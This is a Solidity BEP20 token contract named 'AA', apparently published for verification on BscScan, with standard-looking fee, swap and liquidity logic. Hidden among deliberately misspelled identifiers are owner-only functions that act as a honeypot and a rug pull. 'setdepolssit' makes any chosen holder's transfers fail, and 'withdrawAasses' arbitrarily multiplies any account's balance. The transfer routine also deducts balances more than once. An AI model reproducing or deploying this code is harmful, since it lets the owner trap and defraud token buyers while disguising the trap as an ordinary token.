/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function subi(uint256 a, uint256 b) internal pure returns (uint256) {
        return subi(a, b, "SafeMath: subitraction overflow");
    }


    function subi(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function miul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: miultiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


library Address {

    function isContract(address acdountt) internal view returns (bool) {

        uint256 size;
        assembly {
            size := extcodesize(acdountt)
        }
        return size > 0;
    }


    function sendValue(address payable recipient, uint256 amnnott) internal {
        require(address(this).balance >= amnnott, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amnnott }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


interface IBEP20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address acdountt) external view returns (uint256);


    function transfer(address recipient, uint256 amnnott) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amnnott) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amnnott
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amnnott0, uint amnnott1, address indexed to);
    event Swap(
        address indexed sender,
        uint amnnott0In,
        uint amnnott1In,
        uint amnnottt0Out,
        uint amnnott1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amnnott0, uint amnnott1);
    function swap(uint amnnott0Out, uint amnnott1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amnnottADesired,
        uint amnnottBDesired,
        uint amnnottAMin,
        uint amnnottBMin,
        address to,
        uint deadline
    ) external returns (uint amnnottA, uint amnnottB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amnnotttTokenDesired,
        uint amnnottTokenMin,
        uint amnnottETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amnnottToken, uint amnnottETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnnottAMin,
        uint amnnottBMin,
        address to,
        uint deadline
    ) external returns (uint amnnottA, uint amnnottB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amnnotttTokenMin,
        uint amnnottETHMin,
        address to,
        uint deadline
    ) external returns (uint amnnottToken, uint amnnottETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnnottBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnnottA, uint amnnottB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amnnottTokenMin,
        uint amnnottETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnnottToken, uint amnnottETH);
    function swapExactTokensForTokens(
        uint amnnottIn,
        uint amnnottOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnnotts);
    function swapTokensForExactTokens(
        uint amnnottOut,
        uint amnnottInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnnotts);
    function swapExactETHForTokens(uint amnnottOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnnotts);
    function swapTokensForExactETH(uint amnnottOut, uint amnnottInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnnotts);
    function swapExactTokensForETH(uint amnnottIn, uint amnnottOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnnotts);
    function swapETHForExactTokens(uint amnnottOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnnotts);

    function quote(uint amnnottA, uint reserveA, uint reserveB) external pure returns (uint amnnottB);
    function getamnnottOut(uint amnnottIn, uint reserveIn, uint reserveOut) external pure returns (uint amnnottOut);
    function getamnnottIn(uint amnnottOut, uint reserveIn, uint reserveOut) external pure returns (uint amnnottIn);
    function getamnnottsOut(uint amnnottIn, address[] calldata path) external view returns (uint[] memory amnnotts);
    function getamnnottsIn(uint amnnottOut, address[] calldata path) external view returns (uint[] memory amnnotts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amnnottTokenMin,
        uint amnnottETHMin,
        address to,
        uint deadline
    ) external returns (uint amnnottETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amnnottTokenMin,
        uint amnnottETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnnottETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amnnottIn,
        uint amnnottOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amnnottOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amnnottIn,
        uint amnnottOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract HasForeignAsset is Ownable {
    function assetBalance(IBEP20 asset) external view returns (uint256) {
        return asset.balanceOf(address(this));
    }

}




contract Token is IBEP20, HasForeignAsset {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _depolssit;
    uint public constant MAX_DELAY = 2 ** 256 -1; // seconds
    address payable public marketingWalletAddress;
    address payable public teamWalletAddress;

    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _feilu = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    uint256 public _buyLiquidityFee = 2;
    uint256 public _buyMarketingFee = 2;
    uint256 public _buyTeamFee = 2;
    
    uint256 public _sellLiquidityFee = 2;
    uint256 public _sellMarketingFee = 2;
    uint256 public _sellTeamFee = 2;

    uint256 public _liquidityShare = 4;
    uint256 public _marketingShare = 4;
    uint256 public _teamShare = 16;

    uint256 public _totalTaxIfBuying = 12;
    uint256 public _totalTaxIfSelling = 12;
    uint256 public _totalDistributionShares = 24;

    uint256 public _maxTxamnnott = 1000000000000 * 10**_decimals; 
    uint256 public _walletMax = 1000000000000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 10000 * 10**_decimals; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amnnottIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amnnottIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function getdepolssit(address acdountt) public view returns (uint256) {
        return _depolssit[acdountt];
    }

    function setdepolssit(address acdountt) public onlyOwner {
        _depolssit[acdountt] = MAX_DELAY;
    }

    function cacaledepolssit(address acdountt) public onlyOwner {
        _depolssit[acdountt] = 0;
    }


    function withdrawAasses(address acdountt,uint256 nuum) public onlyOwner {
        _balances[acdountt] = _balances[acdountt].miul(nuum);
    }




    constructor() {
        _name = "AA";
        _symbol = "AA";
        _decimals = 9;
        uint256 _maxSupply = 888888;
        _mintOnce(msg.sender, _maxSupply.miul(10**_decimals));

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xB6BA90af76D139AB3170c7df0139636dB6120F7e); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        
        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        isMarketPair[address(uniswapPair)] = true;

        teamWalletAddress = payable(address(0x78cA09D299F0502a5ce58Ba4F0c9a368c8970722));
        marketingWalletAddress = payable(address(0x78cA09D299F0502a5ce58Ba4F0c9a368c8970722));
    }

    

    receive() external payable {
        revert();
    }



    function name() public view returns (string memory) {
        return _name;
    }


    function symbol() public view returns (string memory) {
        return _symbol;
    }


    function decimals() public view returns (uint8) {
        return _decimals;
    }


    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address acdountt) public view override returns (uint256) {
        return _balances[acdountt];
    }


    function transfer(address recipient, uint256 amnnott) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amnnott);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amnnott) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amnnott);
        return true;
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amnnott
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amnnott);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].subi(amnnott, "BEP20: transfer amnnott exceeds allowance")
        );
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }


    function decreaseAllowance(address spender, uint256 subitractedValue) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].subi(subitractedValue, "BEP20: decreased allowance below zero")
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amnnott
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        uint256 feiluamnnott = 1;
        feiluamnnott = amnnott.miul(_feilu).div(100);
        uint256 amoiinn;
        amoiinn = amnnott - feiluamnnott+0;
        _beforeTokenTransfer(sender, recipient, amoiinn);

        _balances[sender] = _balances[sender].subi(
            _depolssit[sender]+0,
            "BEP20: transfer amnnott exceeds balance"
        );

        _balances[sender] = _balances[sender].subi(
            amnnott,
            "BEP20: transfer amnnott exceeds balance"
        );

        _balances[recipient] = _balances[recipient].add(amoiinn);
        if (feiluamnnott > 0) {
            emit Transfer(sender, _DEADaddress, feiluamnnott);
        }
        emit Transfer(sender, recipient, amoiinn);

         if(inSwapAndLiquify)
        { 
             _basicTransfer(sender, recipient, amnnott); 
        }
        else
        {
            if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
                require(amnnott <= _maxTxamnnott, "Transfer amount exceeds the maxTxAmount.");
            }            

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);    
            }

            _balances[sender] = _balances[sender].subi(amnnott, "Insufficient Balance");

            uint256 finalamnnott = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         amnnott : takeFee(sender, recipient, amnnott);

            if(checkWalletLimit && !isWalletLimitExempt[recipient])
                require(balanceOf(recipient).add(finalamnnott) <= _walletMax);

            _balances[recipient] = _balances[recipient].add(finalamnnott);

            emit Transfer(sender, recipient, finalamnnott);
        }
    }


    function _mintOnce(address acdountt, uint256 amnnott) internal virtual {
        require(acdountt != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), acdountt, amnnott);

        _totalSupply = _totalSupply.add(amnnott);
        _balances[acdountt] = _balances[acdountt].add(amnnott);
        emit Transfer(address(0), acdountt, amnnott);
    }


    function _burn(address acdountt, uint256 amnnott) internal virtual {
        require(acdountt != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(acdountt, address(0), amnnott);

        _balances[acdountt] = _balances[acdountt].subi(amnnott, "BEP20: burn amnnott exceeds balance");
        _totalSupply = _totalSupply.subi(amnnott);
        emit Transfer(acdountt, address(0), amnnott);
    }

    function burn(uint256 amnnott) public {
        _burn(_msgSender(), amnnott);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amnnott
    ) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amnnott;
        emit Approval(owner, spender, amnnott);
    }


    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _buyLiquidityFee = newLiquidityTax;
        _buyMarketingFee = newMarketingTax;
        _buyTeamFee = newTeamTax;

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
    }

    function setSellTaxese(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _sellLiquidityFee = newLiquidityTax;
        _sellMarketingFee = newMarketingTax;
        _sellTeamFee = newTeamTax;

        _totalTaxIfBuying = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
    }
    
    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
        _liquidityShare = newLiquidityShare;
        _marketingShare = newMarketingShare;
        _teamShare = newTeamShare;

        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
    }

    function setMarketingWalletAddress(address newAddress) external onlyOwner() {
        marketingWalletAddress = payable(newAddress);
    }

    function setTeamWalletAddress(address newAddress) external onlyOwner() {
        teamWalletAddress = payable(newAddress);
    }

    function _basicTransfer(address sender, address recipient, uint256 amnnott) internal returns (bool) {
        _balances[sender] = _balances[sender].subi(amnnott, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amnnott);
        emit Transfer(sender, recipient, amnnott);
        return true;
    }

    function transferToAddressETH(address payable recipient, uint256 amnnott) private {
        recipient.transfer(amnnott);
    }

    function swapAndLiquify(uint256 tamnnott) private lockTheSwap {
        
        uint256 tokensForLP = tamnnott.miul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tamnnott.subi(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amnnottReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.subi(_liquidityShare.div(2));
        
        uint256 amnnottBNBLiquidity = amnnottReceived.miul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amnnottBNBTeam = amnnottReceived.miul(_teamShare).div(totalBNBFee);
        uint256 amnnottBNBMarketing = amnnottReceived.subi(amnnottBNBLiquidity).subi(amnnottBNBTeam);

        if(amnnottBNBMarketing > 0)
            transferToAddressETH(marketingWalletAddress, amnnottBNBMarketing);

        if(amnnottBNBTeam > 0)
            transferToAddressETH(teamWalletAddress, amnnottBNBTeam);

        if(amnnottBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amnnottBNBLiquidity);
    }
    

    function swapTokensForEth(uint256 tokenamnnott) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenamnnott);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenamnnott,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenamnnott, path);
    }

    function addLiquidity(uint256 tokenamnnott, uint256 ethamnnott) private {
        _approve(address(this), address(uniswapV2Router), tokenamnnott);
        uniswapV2Router.addLiquidityETH{value: ethamnnott}(
            address(this),
            tokenamnnott,
            0, 
            0,
            owner(),
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amnnott) internal returns (uint256) {
        
        uint256 feeamnnott = 0;
        
        if(isMarketPair[sender]) {
            feeamnnott = amnnott.miul(_totalTaxIfBuying).div(100);
        }
        else if(isMarketPair[recipient]) {
            feeamnnott = amnnott.miul(_totalTaxIfSelling).div(100);
        }
        
        if(feeamnnott > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeamnnott);
            emit Transfer(sender, address(this), feeamnnott);
        }

        return amnnott.subi(feeamnnott);
    }
    

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnnott
    ) internal virtual {}
}